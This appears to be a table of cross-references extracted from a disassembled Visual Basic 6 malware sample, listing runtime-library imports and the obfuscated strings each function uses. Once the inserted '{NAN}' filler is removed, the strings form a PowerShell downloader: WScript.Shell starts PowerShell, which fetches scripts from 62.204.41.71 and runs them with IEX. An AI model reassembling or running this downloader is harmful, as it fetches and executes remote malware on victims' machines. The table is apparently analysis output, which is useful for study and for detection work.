reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40259b	0x40191c	string	0x402420	$c4='b{NAN}{NAN}Cli{NAN}{NAN}en{NAN}{NAN}t{NAN}).Do{NAN}{NAN}wn{NAN}{NAN}l{NAN}o';
0x4025b8	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x4025c5	0x401b74	string	0x402420	$c3='a{NAN}dS{NAN}{NAN}t{NAN}ri{NAN}{NAN}n{NAN}g{NAN}(''h{NAN}tt{NAN}p:/{NAN}/62.204.41.71/cs/Fax.oo''){NAN}';
0x4025e5	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x402612	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x40263f	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x40264c	0x401b40	string	0x402420	IEX $TC |IEX
0x40266c	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x402694	0x401058	import	0x402420	MSVBVM60.DLL.__vbaStrVarVal
0x40269b	0x401044	import	0x402420	MSVBVM60.DLL.rtcReplace
0x4026ba	0x401008	import	0x402420	MSVBVM60.DLL.__vbaVarMove
0x4026c6	0x401094	import	0x402420	MSVBVM60.DLL.__vbaFreeStr
0x4026e2	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x4026f7	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x40270c	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x402721	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x402736	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x402741	0x401008	import	0x402420	MSVBVM60.DLL.__vbaVarMove
0x402765	0x401010	import	0x402420	MSVBVM60.DLL.__vbaFreeVarList
0x4027ac	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x4027c1	0x40107c	import	0x402420	MSVBVM60.DLL.__vbaVarAdd
0x402828	0x401034	import	0x402420	MSVBVM60.DLL.__vbaObjVar
0x40282f	0x401078	import	0x402420	MSVBVM60.DLL.__vbaLateMemCall
0x402848	0x401010	import	0x402420	MSVBVM60.DLL.__vbaFreeVarList
0x40286a	0x401094	import	0x402420	MSVBVM60.DLL.__vbaFreeStr
0x402895	0x401010	import	0x402420	MSVBVM60.DLL.__vbaFreeVarList
0x4028a2	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028ab	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028b4	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028bd	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028c6	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028cf	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028db	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028e7	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028f3	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x4028ff	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x40290b	0x40100c	import	0x402420	MSVBVM60.DLL.__vbaFreeVar
0x40297e	0x401020	import	0x402930	MSVBVM60.DLL.__vbaOnError
0x40298b	0x401710	string	0x402930	W{NAN}{NAN}Sc{NAN}{NAN}r{NAN}{NAN}ip{NAN}t.Sh{NAN}{NAN}e{NAN}{NAN}l{NAN}l
0x4029a8	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x4029d0	0x401058	import	0x402930	MSVBVM60.DLL.__vbaStrVarVal
0x4029d7	0x401044	import	0x402930	MSVBVM60.DLL.rtcReplace
0x4029f6	0x401008	import	0x402930	MSVBVM60.DLL.__vbaVarMove
0x402a02	0x401094	import	0x402930	MSVBVM60.DLL.__vbaFreeStr
0x402a1c	0x401058	import	0x402930	MSVBVM60.DLL.__vbaStrVarVal
0x402a2a	0x401050	import	0x402930	MSVBVM60.DLL.rtcCreateObject2
0x402a3e	0x401074	import	0x402930	MSVBVM60.DLL.__vbaVarSetVar
0x402a4a	0x401094	import	0x402930	MSVBVM60.DLL.__vbaFreeStr
0x402a57	0x4017c0	string	0x402930	p{NAN}{NAN}o{NAN}{NAN}we{NAN}{NAN}rs{NAN}{NAN}he{NAN}{NAN}l{NAN}{NAN}l
0x402a74	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402a81	0x401854	string	0x402930	$c1='{NAN}(N{NAN}{NAN}e{NAN}w-{NAN}Ob{NAN}{NAN}je{NAN}{NAN}c{NAN}t N{NAN}{NAN}e{NAN}t.W{NAN}e';
0x402a9e	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402aab	0x40191c	string	0x402930	$c4='b{NAN}{NAN}Cli{NAN}{NAN}en{NAN}{NAN}t{NAN}).Do{NAN}{NAN}wn{NAN}{NAN}l{NAN}o';
0x402ac8	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402ad5	0x401c58	string	0x402930	$c3='a{NAN}dS{NAN}{NAN}t{NAN}ri{NAN}{NAN}n{NAN}g{NAN}(''h{NAN}tt{NAN}p:/{NAN}/62.204.41.71/cs/RED.oo''){NAN}';
0x402af5	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402b22	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402b4f	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402b5c	0x401b40	string	0x402930	IEX $TC |IEX
0x402b7c	0x401080	import	0x402930	MSVBVM60.DLL.__vbaVarCopy
0x402ba4	0x401058	import	0x402930	MSVBVM60.DLL.__vbaStrVarVal
0x402bab	0x401044	import	0x402930	MSVBVM60.DLL.rtcReplace
0x402bca	0x401008	import	0x402930	MSVBVM60.DLL.__vbaVarMove
0x402bd6	0x401094	import	0x402930	MSVBVM60.DLL.__vbaFreeStr
0x402bf2	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402c07	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402c1c	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402c31	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402c46	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402c51	0x401008	import	0x402930	MSVBVM60.DLL.__vbaVarMove
0x402c75	0x401010	import	0x402930	MSVBVM60.DLL.__vbaFreeVarList
0x402cbc	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402cd1	0x40107c	import	0x402930	MSVBVM60.DLL.__vbaVarAdd
0x402d38	0x401034	import	0x402930	MSVBVM60.DLL.__vbaObjVar
0x402d3f	0x401078	import	0x402930	MSVBVM60.DLL.__vbaLateMemCall
0x402d58	0x401010	import	0x402930	MSVBVM60.DLL.__vbaFreeVarList
0x402d7a	0x401094	import	0x402930	MSVBVM60.DLL.__vbaFreeStr
0x402da5	0x401010	import	0x402930	MSVBVM60.DLL.__vbaFreeVarList
0x402db2	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402dbb	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402dc4	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402dcd	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402dd6	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402ddf	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402deb	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402df7	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402e03	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402e0f	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402e1b	0x40100c	import	0x402930	MSVBVM60.DLL.__vbaFreeVar
0x402e8e	0x401020	import	0x402e40	MSVBVM60.DLL.__vbaOnError
0x402e9b	0x401710	string	0x402e40	W{NAN}{NAN}Sc{NAN}{NAN}r{NAN}{NAN}ip{NAN}t.Sh{NAN}{NAN}e{NAN}{NAN}l{NAN}l
0x402eb8	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x402ee0	0x401058	import	0x402e40	MSVBVM60.DLL.__vbaStrVarVal
0x402ee7	0x401044	import	0x402e40	MSVBVM60.DLL.rtcReplace
0x402f06	0x401008	import	0x402e40	MSVBVM60.DLL.__vbaVarMove
0x402f12	0x401094	import	0x402e40	MSVBVM60.DLL.__vbaFreeStr
0x402f2c	0x401058	import	0x402e40	MSVBVM60.DLL.__vbaStrVarVal
0x402f3a	0x401050	import	0x402e40	MSVBVM60.DLL.rtcCreateObject2
0x402f4e	0x401074	import	0x402e40	MSVBVM60.DLL.__vbaVarSetVar
0x402f5a	0x401094	import	0x402e40	MSVBVM60.DLL.__vbaFreeStr
0x402f67	0x4017c0	string	0x402e40	p{NAN}{NAN}o{NAN}{NAN}we{NAN}{NAN}rs{NAN}{NAN}he{NAN}{NAN}l{NAN}{NAN}l
0x402f84	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x402f91	0x401854	string	0x402e40	$c1='{NAN}(N{NAN}{NAN}e{NAN}w-{NAN}Ob{NAN}{NAN}je{NAN}{NAN}c{NAN}t N{NAN}{NAN}e{NAN}t.W{NAN}e';
0x402fae	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x402fbb	0x40191c	string	0x402e40	$c4='b{NAN}{NAN}Cli{NAN}{NAN}en{NAN}{NAN}t{NAN}).Do{NAN}{NAN}wn{NAN}{NAN}l{NAN}o';
0x402fd8	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x402fe5	0x401d3c	string	0x402e40	$c3='a{NAN}dS{NAN}{NAN}t{NAN}ri{NAN}{NAN}n{NAN}g{NAN}(''h{NAN}tt{NAN}p:/{NAN}/62.204.41.71/Offer/Offer.oo''){NAN}';
0x403005	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x403032	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x40305f	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x40306c	0x401b40	string	0x402e40	IEX $TC |IEX
0x40308c	0x401080	import	0x402e40	MSVBVM60.DLL.__vbaVarCopy
0x4030b4	0x401058	import	0x402e40	MSVBVM60.DLL.__vbaStrVarVal
0x4030bb	0x401044	import	0x402e40	MSVBVM60.DLL.rtcReplace
0x4030da	0x401008	import	0x402e40	MSVBVM60.DLL.__vbaVarMove
0x4030e6	0x401094	import	0x402e40	MSVBVM60.DLL.__vbaFreeStr
0x403102	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x403117	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x40312c	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x403141	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x403156	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x403161	0x401008	import	0x402e40	MSVBVM60.DLL.__vbaVarMove
0x403185	0x401010	import	0x402e40	MSVBVM60.DLL.__vbaFreeVarList
0x4031cc	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x4031e1	0x40107c	import	0x402e40	MSVBVM60.DLL.__vbaVarAdd
0x403248	0x401034	import	0x402e40	MSVBVM60.DLL.__vbaObjVar
0x40324f	0x401078	import	0x402e40	MSVBVM60.DLL.__vbaLateMemCall
0x403268	0x401010	import	0x402e40	MSVBVM60.DLL.__vbaFreeVarList
0x40327e	0x401094	import	0x402e40	MSVBVM60.DLL.__vbaFreeStr
0x4032a9	0x401010	import	0x402e40	MSVBVM60.DLL.__vbaFreeVarList
0x4032b6	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032bf	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032c8	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032d1	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032da	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032e3	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032ef	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x4032fb	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x403307	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x403313	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
0x40331f	0x40100c	import	0x402e40	MSVBVM60.DLL.__vbaFreeVar
